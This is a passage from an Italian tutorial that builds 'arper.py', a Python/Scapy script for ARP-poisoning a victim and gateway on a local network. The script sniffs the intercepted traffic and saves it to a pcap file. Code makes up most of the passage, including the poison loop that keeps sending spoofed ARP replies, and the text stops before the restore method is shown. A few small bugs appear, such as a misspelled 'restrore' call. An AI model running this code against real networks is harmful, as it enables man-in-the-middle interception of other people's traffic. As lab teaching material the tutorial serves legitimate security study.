&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;wind3.hub &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.1&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a b8:d5:26:69:b5:dc &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
Kobra3390.wind3.hub &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.233&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; associato a 18:cc:18:fa:ad:b1 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;ether&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; su wlp61s0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;192.168.1.233 è l’indirizzo IP della macchina Kali, mentre 192.168.1.1 è l’indirizzo IP del gateway. Oltre ai loro indirizzi IP possiamo vedere i loro indirizzi MAC. Prendiamo nota di questi valori in quanto, visualizzando la cache ARP ad attacco iniziato, potremo verificare di aver provocato il cambio dell’indirizzo MAC registrato per il gateway.&lt;/p&gt;
&lt;p&gt;Conoscendo l’indirizzo IP dell’attaccante e del gateway possiamo spostarci sulla macchina attaccante e preparare lo script Python, chiameremo lo script arper.py:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; multiprocessing &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; Process
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; scapy.all &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; (ARP, Ether, conf, get_if_hwaddr, 
                        send, sniff, sndrcv, srp, wrpcap)

&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; sys&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; time

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;restore&lt;/span&gt;(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;pass&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
    (victim, gateway, interface) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
    myarp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Arper(victim, gateway, interface)
    myarp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;run()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Come si vede, definiamo una funzione helper per ottenere l’ indirizzo MAC per una determinata macchina e una classe &lt;strong&gt;Arper&lt;/strong&gt; per fare poisoning (metodo poison), sniffare (metodo sniff) e ripristinare (metodo restore) la configurazione di rete. Completiamo ogni sezione iniziando con la funzione &lt;strong&gt;get_mac&lt;/strong&gt; che restituisce un indirizzo MAC per uno specifico indirizzo IP. Ci servono gli indirizzi MAC della vittima e del gateway:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;get_mac&lt;/span&gt;(targetip):
    packet &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Ether(dst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ff:ff:ff:ff:ff:ff&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;ARP(op&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;who-has&amp;#34;&lt;/span&gt;, pdst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;targetip)
    resp, _ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; srp(packet, timeout&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, retry&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, verbose&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _, r &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; resp:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r[Ether]&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;src
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Le passiamo l’indirizzo IP dell’obiettivo e creiamo un pacchetto. La funzione &lt;strong&gt;Ether&lt;/strong&gt; specifica che il pacchetto è concepito per essere un broadcast e la funzione ARP che la richiesta punta a sapere l’indirizzo MAC collegato chiedendo a ogni nodo della rete se è in possesso di quell’indirizzo IP. Inviamo poi il pacchetto con la funzione di Scapy &lt;strong&gt;srp&lt;/strong&gt; che si occupa di inviare e ricevere pacchetti a livello 2 della rete. Riceviamo la risposta nella variabile &lt;strong&gt;resp&lt;/strong&gt; che dovrebbe contenere la sorgente &lt;strong&gt;Ether&lt;/strong&gt; (il MAC address) del corrispondente indirizzo IP. Subito dopo, iniziamo a scrivere la classe &lt;strong&gt;Arper&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Arper&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __init__(self, victim, gateway, interface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eth0&amp;#39;&lt;/span&gt;):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; victim
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(victim)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; gateway
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_mac(gateway)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;iface &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; interface
        conf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;verb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Initialized &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;interface&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Gateway (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;gateway&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Victim (&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;victim&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;) is at &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Inizializziamo la classe con gli indirizzi IP del gateway e della vittima e specifichiamo l’interfaccia che vogliamo utilizzare (&lt;em&gt;eth0&lt;/em&gt; è l’opzione di default). Popoliamo le variabili interne dell’oggetto con &lt;strong&gt;interface&lt;/strong&gt;, &lt;strong&gt;victim&lt;/strong&gt;, &lt;strong&gt;victimmac&lt;/strong&gt;, &lt;strong&gt;gateway&lt;/strong&gt; e &lt;strong&gt;gatewaymac&lt;/strong&gt; stampandone i valori a console.&lt;/p&gt;
&lt;p&gt;All’interno della classe &lt;strong&gt;Arper&lt;/strong&gt; scriviamo la funzione run che rappresenta l’entry point del nostro attacco:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;run&lt;/span&gt;(self):
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;start()

        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff_thread &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Process(target&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sniff)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;run&lt;/strong&gt; esegue tutto il lavoro principale dell’oggetto &lt;strong&gt;Arper&lt;/strong&gt;. Imposta ed esegue due processi:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Il primo avvelena la cache ARP&lt;/li&gt;
&lt;li&gt;Il secondo ci permette di osservare l’evoluzione dell’attacco sniffando il traffico di rete&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Il metodo &lt;strong&gt;poison&lt;/strong&gt; produce i pacchetti “avvelenati” e li invia alla vittima e al gateway:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;poison&lt;/span&gt;(self):
        poison_victim &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
        poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victimmac
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(poison_victim&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        poison_gateway &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ARP()
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;op &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;victim
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gateway
        poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gatewaymac
        
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;psrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ip dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac dst: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwdst&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mac src: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hwsrc&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
        print(poison_gateway&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;summary())
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Beginning the ARP poison. [CTRL-C to stop]&amp;#39;&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)
            sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;stdout&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;flush()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
                send(poison_victim)
                send(poison_gateway)
            &lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
                self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restore()
                sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
                time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;poison&lt;/strong&gt; imposta i dati che useremo per “avvelenare” la vittima e il gateway. Per prima cosa, creiamo un pacchetto ARP &lt;em&gt;poisoned&lt;/em&gt; per la vittima. Allo stesso modo, ne prepariamo uno per il gateway. Inganniamo il gateway inviandogli l’indirizzo IP della vittima ma con il MAC dell’aggressore. Facciamo poi lo stesso inviando alla vittima l’indirizzo IP del gateway ma con il MAC address dell’aggressore. Stampando tutti i dettagli di queste operazioni a console potremo essere certi di aver fissato correttamente indirizzi destinazione e payload.&lt;/p&gt;
&lt;p&gt;Poi iniziamo a spedire i pacchetti “avvelenati” alle destinazioni in un ciclo infinito per assicurarci che le rispettive voci nelle cache ARP rimangano corrotte per tutta la durata dell’attacco.&lt;/p&gt;
&lt;p&gt;Porremo fine al ciclo solo quando immetteremo la combinazione da tastiera CTRL-C (KeyboardInterrupt) e da lì ripristineremo la situazione riportandola alla normalità, inviando informazioni corrette sia alla vittima sia al gateway e cancellando gli effetti del nostro attacco.&lt;/p&gt;
&lt;p&gt;Per vedere e registrare cosa succede durante le nostre operazioni di &lt;em&gt;poisoning&lt;/em&gt;, intercettiamo il traffico di rete con il metodo &lt;strong&gt;sniff&lt;/strong&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sniff&lt;/span&gt;(self, count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;):
        time&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sniffing &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;count&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; packets&amp;#39;&lt;/span&gt;)
        bpf_filter &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ip host &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%s&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; victim
        packets &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; sniff(count&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;count, filter&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;bpf_filter, iface&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interface)
        wrpcap(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;arper.pcap&amp;#39;&lt;/span&gt;, packets)
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Got the packets&amp;#39;&lt;/span&gt;)
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;restrore()
        self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;poison_thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;terminate()
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Finished.&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Il metodo &lt;strong&gt;sniff&lt;/strong&gt; resta in pausa per cinque secondi prima di iniziare lo &lt;em&gt;sniffing&lt;/em&gt; per dare tempo al thread che esegue il vero e proprio &lt;em&gt;poisoning&lt;/em&gt; di avviarsi. Intercetta un determinato numero di pacchetti (100 di default), filtrando quelli che contengono l’indirizzo IP della vittima. Una volta catturati i pacchetti, ne salviamo il contenuto su un file che chiameremo &lt;em&gt;arper.pcap&lt;/em&gt;, ripristiniamo le tabelle ARP ai loro valori originali e fermiamo il thread che sta conducendo l’attacco.&lt;/p&gt;
&lt;p&gt;Da ultimo, il metodo &lt;strong&gt;restore&lt;/strong&gt; riporta la vittima e il gateway al loro stato originale inviando informazioni ARP corrette alle rispettive macchine:&lt;/p&gt;
